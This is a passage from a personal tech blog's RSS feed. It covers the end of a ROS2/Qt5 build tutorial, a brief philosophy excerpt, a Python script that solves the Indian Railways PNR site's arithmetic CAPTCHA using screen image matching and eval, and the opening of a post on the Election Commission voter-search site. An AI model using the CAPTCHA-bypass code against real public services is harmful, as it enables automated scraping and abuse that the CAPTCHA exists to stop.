+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml-model &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;download.ros.org&#x2F;schema&#x2F;package_format2.xsd&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;schematypens&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;package &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;demo&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;0.0.1&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;description&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;A demo app for the blog&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;description&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;maintainer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;nope@notgoogle.com&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;Amar Lakshya&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;maintainer&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;license&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;Apache License 2.0&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;license&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buildtool_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;ament_cmake&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buildtool_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;rclcpp&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;std_msgs&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;qtbase5-dev&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;qt5-qmake&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exec_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;libqt5-core&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exec_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exec_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;rclcpp&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exec_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exec_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;std_msgs&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exec_depend&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;export&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_type&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;ament_cmake&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;build_type&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;export&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;package&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;step-4-let-s-restructure-the-directory-to-clean-everything&quot;&gt;Step - 4: Let&#x27;s restructure the directory to clean everything.&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;First, create an &lt;code&gt;src&lt;&#x2F;code&gt; directory and move everything in it as a ROS2 package ( let&#x27;s say &lt;code&gt;demo&lt;&#x2F;code&gt;) . Now, create an &lt;code&gt;src&lt;&#x2F;code&gt; directory and move all the &lt;code&gt;qml&lt;&#x2F;code&gt;, &lt;code&gt;cpp&lt;&#x2F;code&gt;, &lt;code&gt;qml.qrc&lt;&#x2F;code&gt; and &lt;code&gt;conf&lt;&#x2F;code&gt; files in that directory. Now your project folder should look something like this:&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span&gt; src
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span&gt; demo
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; CMakeLists.txt
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; demo.pro
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; demo.pro.user
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; package.xml
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span&gt; src
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; main.cpp
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; main.qml
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; Page1Form.ui.qml
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; Page2Form.ui.qml
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span&gt; qml.qrc
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span&gt; qtquickcontrols2.conf
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt; directories, 10 files
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;step-5-all-set-time-to-build-the-package&quot;&gt;Step - 5: All set, time to build the package!&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Now, source your ROS2 workspace and run: &lt;code&gt;ament build&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Doing these steps, you should get a ROS2 Qt5 app package called &lt;code&gt;demo&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;step-6-running-the-package-in-qtcreator&quot;&gt;Step - 6: running the package in qtcreator!&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Note that you will be easily able to run the package using ros2 commandline options, however, It would make our lives
+incredibly easy to run and build our Qt5 app in the Qt Creator.&lt;&#x2F;p&gt;
+&lt;p&gt;For that, first install the RTPS middleware system-wide by following directions on their project page: 
+&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;eProsima&#x2F;Fast-RTPS#installation-from-source&quot;&gt;RTPS Build instructions&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;and that&#x27;s it! Now source your ROS2 workspace and go to your Qt5 app folder and just run &lt;code&gt;qtcreator&lt;&#x2F;code&gt;!&lt;&#x2F;p&gt;
+&lt;p&gt;You will now be able to develop Qt5 apps with ROS2 in the Qt Creator&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;TIP&lt;&#x2F;strong&gt;: Here is the git-hosted &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;amar-laksh&#x2F;ros2qt_demo&quot;&gt;sample project&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+</description>
+        </item>
+        <item>
+            <title>Beyond Good and Evil - A look at why to be neither</title>
+            <pubDate>Sat, 17 Jun 2017 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/beyond-good-and-evil/</link>
+            <guid>https://amar-laksh.github.io/posts/beyond-good-and-evil/</guid>
+            <description>&lt;p&gt;&lt;strong&gt;Introduction&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Why is a good habit a good habit? Why is something considered to be evil? Though sounding perplexing and contradicting, it is still a question to ask ourselves. 
+What exactly are these moralistic pillars? Upon what prospect and prerequisites are they based? And yet another important and final question, what are the apt answers to all of them? 
+The whole concept of Good and Evil is defined and argued on the basis of two definitive terms, namely; Good and Evil. &lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+</description>
+        </item>
+        <item>
+            <title>Updating CAPTCHA for CAPCTHA&#x27;s sake? OR How you get to automate the PNR website.</title>
+            <pubDate>Sat, 17 Jun 2017 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/irctcs-new-defense/</link>
+            <guid>https://amar-laksh.github.io/posts/irctcs-new-defense/</guid>
+            <description>&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;old-pnr-status.png&quot; alt=&quot;Old website&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;This was the good old Indian Railways website to track information about a railway ticket by using the &lt;em&gt;PNR number&lt;&#x2F;em&gt;. As we will see this was not the best website design so the staff decided to update the U.I. and more importantly the CAPTCHA method used on the webpage.&lt;&#x2F;p&gt;
+&lt;p&gt;The update resulted in this:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;new-pnr-status.png&quot; alt=&quot;New website&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now you may ask what&#x27;s the catch here?&lt;&#x2F;p&gt;
+&lt;p&gt;Well let&#x27;s see what happens when we enter a PNR in the textfield.&lt;&#x2F;p&gt;
+&lt;p&gt;This happens:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;new-pnr-captcha.png&quot; alt=&quot;New captcha&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The new CAPTCHA system might seem a bit more sophistcated than the simple one used earlier. It is. But...&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Simplicity is the ultimate sophistication.&lt;&#x2F;em&gt;
+-Leonardo Da Vinci&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;And sure it became apparent as I had the idea to try the previous solution in my earlier &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;amar-laksh.github.io&#x2F;posts&#x2F;captchas-on-ceo-sites&#x2F;&quot;&gt;blog post&lt;&#x2F;a&gt; to this one.&lt;&#x2F;p&gt;
+&lt;p&gt;From the old blog post we know how to extract the digits. We just capture all the multiple digits that is possible in this CAPTCHA and then with a little python help&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;pyautogui &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;do
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;lvalue&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;image&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;directory&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    leftValue = {}
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;do.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;locateAllOnScreen&lt;&#x2F;span&gt;&lt;span&gt;(
+&lt;&#x2F;span&gt;&lt;span&gt;                directory
+&lt;&#x2F;span&gt;&lt;span&gt;                +&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(image)+&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.png&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;):
+&lt;&#x2F;span&gt;&lt;span&gt;        leftValue.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt;([(i[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;],image)])
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;leftValue
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getCaptcha&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;directory&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;images&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    captcha = {}
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;image &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;images:
+&lt;&#x2F;span&gt;&lt;span&gt;        captcha.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;lvalue&lt;&#x2F;span&gt;&lt;span&gt;(image, directory))
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;captcha
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; &amp;#39;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(
+&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span&gt;(
+&lt;&#x2F;span&gt;&lt;span&gt;                    str
+&lt;&#x2F;span&gt;&lt;span&gt;                    ,[captcha[key] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sorted&lt;&#x2F;span&gt;&lt;span&gt;(captcha)]
+&lt;&#x2F;span&gt;&lt;span&gt;                    )
+&lt;&#x2F;span&gt;&lt;span&gt;                )
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;images = [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;]
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;expr =  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getCaptcha&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&#x2F;library&#x2F;pnr&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, images)
+&lt;&#x2F;span&gt;&lt;span&gt;                .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;                .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;                .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39; &amp;#39;, &amp;#39;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;        )
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;result = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(expr)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;expr, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; = &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,result
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;and here comes the demo:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;pnr-demo.gif&quot; alt=&quot;demo&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;and voila we have the right answer to the captcha question!&lt;&#x2F;p&gt;
+&lt;p&gt;However, sadly as these weak captchas are on the rise I have decided to put up my code on &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;amar-laksh&#x2F;capturerer&quot;&gt;github&lt;&#x2F;a&gt; for others to add to the database.&lt;&#x2F;p&gt;
+&lt;p&gt;Happy hacking!&lt;&#x2F;p&gt;
+</description>
+        </item>
+        <item>
+            <title>How CAPTCHA is not important? but finding everyone is!</title>
+            <pubDate>Thu, 16 Mar 2017 00:00:00 +0000</pubDate>
+            <link>https://amar-laksh.github.io/posts/captchas-on-ceo-sites/</link>
+            <guid>https://amar-laksh.github.io/posts/captchas-on-ceo-sites/</guid>
+            <description>&lt;p&gt;&lt;a href=&quot;&#x2F;images&#x2F;eci.png&quot;&gt;The Election Commission Of India&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The Elections in India are conducted by this gigantic body of personnels and machines co-ordinating together to form the Election Commission.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;The &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Election_Commission_of_India&quot;&gt;Wiki&lt;&#x2F;a&gt; will tell you that this is an old autonomous body for administrating elections in India. However, The Eleciton Commission also deals with maintaining and providing a large number of data-points generated during the elections.&lt;&#x2F;p&gt;
+&lt;p&gt;One such point for voters and &lt;em&gt;power users&lt;&#x2F;em&gt; is the Voter Infomation website which very usefuly provides the option to search for a voter&#x27;s information.&lt;&#x2F;p&gt;
+</description>
+        </item>
+        <item>
+            <title>How USB Works? (Part 1)</title>
+            <pubDate>Sun, 23 Oct 2016 00:00:00 +0000</pubDate>
